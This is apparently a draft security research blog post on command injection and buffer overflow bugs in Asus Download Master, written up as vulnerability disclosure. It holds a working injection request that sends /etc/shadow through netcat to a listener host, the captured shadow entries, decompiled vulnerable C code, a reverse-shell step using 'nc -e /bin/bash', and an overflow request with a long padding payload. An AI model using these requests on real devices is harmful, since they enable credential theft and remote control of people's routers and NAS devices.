---
title: "Asus Download Master - Pt 2: Command Injections, BoFs"
date: 2024-04-16T18:26:23Z
draft: true
tags: ["notes research cve asus"]
---

## Download Master, pt 2

Alright so here are the fun ones: command injections and buffer overflows.

## Command Injections - CVE-

URL Path parameters are not sanitized prior to their inclusion within `system()` calls, resulting in the ability for authenticated users to perform command injection attacks.
	
The following `action_mode` values lead to unsafe `system` calls via the listed parameters:

`DM_ED2K_ADD` 
- `ED2K_SERVER_IP` and `ED2K_SERVER_PORT`

`DM_ED2K_REM` 
- `ED2K_SERVER_IP` and `ED2K_SERVER_PORT`

`DM_ED2K_CON`
- `ED2K_SERVER_IP` and `ED2K_SERVER_PORT`

`DM_LANG`
- `DM_language`

**Request:**
```
GET http://192.168.1.2:8081/downloadmaster/dm_apply.cgi?action_mode=DM_LANG&DM_language=%60nc+192.168.1.4+8080+%3c+%2fetc%2fshadow%60 HTTP/1.1
Host: 192.168.1.2:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Cookie: AuthByPasswd=asus_app_token:451f786bbe82b2356071dcee9386daa1
```

**Response:**
```
HTTP/1.1 200 OK
ContentType: text/html
Cache-Control: private,max-age=0;
Date: Fri, 28 Jul 2023 00:02:22 GMT
Server: lighttpd/1.4.39
Content-Length: 10

ACK_SUCESS
```

**Listener:**
```
➜  ~ sudo nc -lvp 8080
listening on [any] 8080 ...
192.168.1.2: inverse host lookup failed: Unknown host
connect to [192.168.1.4] from (UNKNOWN) [192.168.1.2] 42977
admin:$5$T[...].E5:0:0:99999:7:0:0:
nas:*:0:0:99999:7:0:0:
nobody:*:0:0:99999:7:0:0:
```

#### Screenshot:
![alt text](images/listener-1.png)

**Vulnerable Code Example:**

Pretty straight forward.

```C
else {
    iVar2 = strcmp(var_action_mode,"DM_LANG");
    if (iVar2 == 0) {
    local_c4 = (undefined *)FUN_0001c498("DM_language");
    if (local_c4 == (undefined *)0x0) {
        local_c4 = &DAT_0002520c;
    }
    memset(&local_13b0,0,0x100);
    memset(acStack_17b0,0,0x100);
    sprintf(acStack_17b0,
            "sed -i \'19s/^.*$/LANGUAGE=%s/\' /opt/etc/dm2_general.conf",local_c4);
    system(acStack_17b0);
    system("cp -rf /opt/etc/dm2_general.conf /tmp/APPS/DM2/Config/dm2_general.conf")
    ;
    memset(acStack_17b0,0,0x100);
    sprintf(acStack_17b0,
            "sed -i \'19s/^.*$/LANGUAGE=%s/\' /opt/etc/dm2_general_bak.conf",
            local_c4);
    system(acStack_17b0);
    system(
            "cp -rf /opt/etc/dm2_general_bak.conf /tmp/APPS/DM2/Config/dm2_general_bak .conf"
            );
    sprintf((char *)&local_13b0,"nvram set gen_lang=%s",local_c4);
    system((char *)&local_13b0);
    system("nvram commit");
    printf("ACK_SUCESS");
    }
```

![alt text](images/injections-code.png)

Pulling the shadow file is fun, sure. But getting a shell is way cooler. Fortunately for me, the device had `ipkg`. Soooo, I just used it to install netcat, then used netcat to connect back lmao. The app might *say* it's unsupported in the response, but it defo got installed >:D

#### Request:
![alt text](images/netcat-install.png)

Set up a listener and send a classic `nc -e /bin/bash`

#### Request:
![alt text](images/netcat-exploit.png)

#### Listener:
![alt text](images/nc-shell.png)

gottem

## Buffer Overflows - CVE-

This one was much more involved than the other bugs and required a lot more effort. I've opted to just include my raw notes, rather than a polished post-mortem. As such, some shit I wrote at the time is just wrong, but it's psuedo stream-of-consciousness note taking, so that's how it works.

### TLDR;

Unsafe usage of `strcpy` via the `dm_ctrl` and `task_id` parameters leads to buffer overflows and full control of the `$PC` register. allowing full remote code execution agains tthe device.

```
GET /downloadmaster/dm_apply.cgi?action_mode=DM_CTRL&dm_ctrl=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&task_id=&download_type=OTHER HTTP/1.1
Host: 192.168.1.2:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Cookie: AuthByPasswd=asus_app_token:26b6ee548766dd93cf7729ca48e9e4e0;
```

**Asus syslog:**

![alt text](images/crash-1.png)

**Emulated:**

![alt text](images/crash-2.png)

### Raw Notes

